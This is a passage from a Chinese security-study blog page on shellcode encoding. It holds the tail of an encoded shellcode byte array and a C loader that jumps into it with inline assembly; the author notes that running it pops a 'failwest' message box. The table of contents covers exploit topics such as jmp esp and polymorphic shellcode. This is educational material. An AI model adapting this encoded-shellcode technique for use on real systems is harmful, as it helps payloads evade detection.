class="line">&quot;\xcf\xb0\xc9\x3a\xb0\x77\x9f\xf3\x40\x6f\xa7\x22\xff\x77\x76\x17&quot;</span><br><span class="line">&quot;\x2c\x31\x37\x21\x36\x10\x77\x96\x20\xcf\x1e\x74\xcf\x0f\x48\xcf&quot;</span><br><span class="line">&quot;\x0d\x58\xcf\x4d\xcf\x2d\x4c\xe9\x79\x2e\x4e\x7c\x5a\x31\x41\xd1&quot;</span><br><span class="line">&quot;\xbb\x13\xbc\xd1\x24\xcf\x01\x78\xcf\x08\x41\x3c\x47\x89\xcf\x1d&quot;</span><br><span class="line">&quot;\x64\x47\x99\x77\xbb\x03\xcf\x70\xff\x47\xb1\xdd\x4b\xfa\x42\x7e&quot;</span><br><span class="line">&quot;\x80\x30\x4c\x85\x8e\x43\x47\x94\x02\xaf\xb5\x7f\x10\x60\x58\x31&quot;</span><br><span class="line">&quot;\xa0\xcf\x1d\x60\x47\x99\x22\xcf\x78\x3f\xcf\x1d\x58\x47\x99\x47&quot;</span><br><span class="line">&quot;\x68\xff\xd1\x1b\xef\x13\x25\x79\x2e\x4e\x7c\x5a\x31\xed\x77\x9f&quot;</span><br><span class="line">&quot;\x17\x2c\x33\x21\x37\x30\x2c\x22\x25\x2d\x28\xcf\x80\x17\x14\x14&quot;</span><br><span class="line">&quot;\x17\xbb\x13\xb8\x17\xbb\x13\xbc\xd4&quot;;</span><br><span class="line">void main()</span><br><span class="line">&#123;</span><br><span class="line">	__asm</span><br><span class="line">	&#123;</span><br><span class="line">		lea eax, final_sc_44</span><br><span class="line">		push eax</span><br><span class="line">		ret</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>编译之后 就能看到failwest弹框了</p>

      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      
        <div class="post-tags">
          
            <a href="/tags/0day安全/" rel="tag"># 0day安全</a>
          
        </div>
      

      
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2019/07/30/栈溢出原理与实践/" rel="next" title="栈溢出原理与实践">
                <i class="fa fa-chevron-left"></i> 栈溢出原理与实践
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/2019/08/01/用-MetaSploit-开发Exploit/" rel="prev" title="用MetaSploit开发Exploit">
                用MetaSploit开发Exploit <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>



    <div class="post-spread">
      
    </div>
  </div>


          </div>
          


          

  



        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            Table of Contents
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
            Overview
          </li>
        </ul>
      

      <section class="site-overview-wrap sidebar-panel">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
            
              <p class="site-author-name" itemprop="name">loser</p>
              <p class="site-description motion-element" itemprop="description"></p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/">
              
                  <span class="site-state-item-count">52</span>
                  <span class="site-state-item-name">posts</span>
                </a>
              </div>
            

            

            
              
              
              <div class="site-state-item site-state-tags">
                
                  <span class="site-state-item-count">7</span>
                  <span class="site-state-item-name">tags</span>
                
              </div>
            

          </nav>

          

          

          
          

          
          

          

        </div>
      </section>

      
      <!--noindex-->
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
              
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#概述"><span class="nav-number">1.</span> <span class="nav-text">概述</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#shellcode-与exploit"><span class="nav-number">1.1.</span> <span class="nav-text">shellcode 与exploit</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#定位shellcode"><span class="nav-number">2.</span> <span class="nav-text">定位shellcode</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#栈帧移位与jmp-esp"><span class="nav-number">2.1.</span> <span class="nav-text">栈帧移位与jmp esp</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#获取“跳板”的地址"><span class="nav-number">2.2.</span> <span class="nav-text">获取“跳板”的地址</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#使用“跳板”定位的exploit"><span class="nav-number">2.3.</span> <span class="nav-text">使用“跳板”定位的exploit</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#缓冲区的组织"><span class="nav-number">3.</span> <span class="nav-text">缓冲区的组织</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#缓冲区的组成"><span class="nav-number">3.1.</span> <span class="nav-text">缓冲区的组成</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#抬高栈顶保护shellcode"><span class="nav-number">3.2.</span> <span class="nav-text">抬高栈顶保护shellcode</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#使用其他跳转指令"><span class="nav-number">3.3.</span> <span class="nav-text">使用其他跳转指令</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#不使用跳转指令"><span class="nav-number">3.3.1.</span> <span class="nav-text">不使用跳转指令</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#函数返回地址移位"><span class="nav-number">3.3.2.</span> <span class="nav-text">函数返回地址移位</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#开发通用的shellcode"><span class="nav-number">4.</span> <span class="nav-text">开发通用的shellcode</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#shellcode-的加载与调试"><span class="nav-number">4.1.</span> <span class="nav-text">shellcode 的加载与调试</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#动态定位API-地址的shellcode"><span class="nav-number">4.2.</span> <span class="nav-text">动态定位API 地址的shellcode</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#shellcode-编码技术"><span class="nav-number">5.</span> <span class="nav-text">shellcode 编码技术</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#为什么要对shellcode-编码"><span class="nav-number">5.1.</span> <span class="nav-text">为什么要对shellcode 编码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#会“变形”的shellcode"><span class="nav-number">5.2.</span> <span class="nav-text">会“变形”的shellcode</span></a></li></ol></li></ol></div>
            

          </div>
        </section>
      <!--/noindex-->
      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">loser</span>

  
</div>


  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>




        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  

  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  





  

  

  

  
  

  

  

  

</body>
</html>
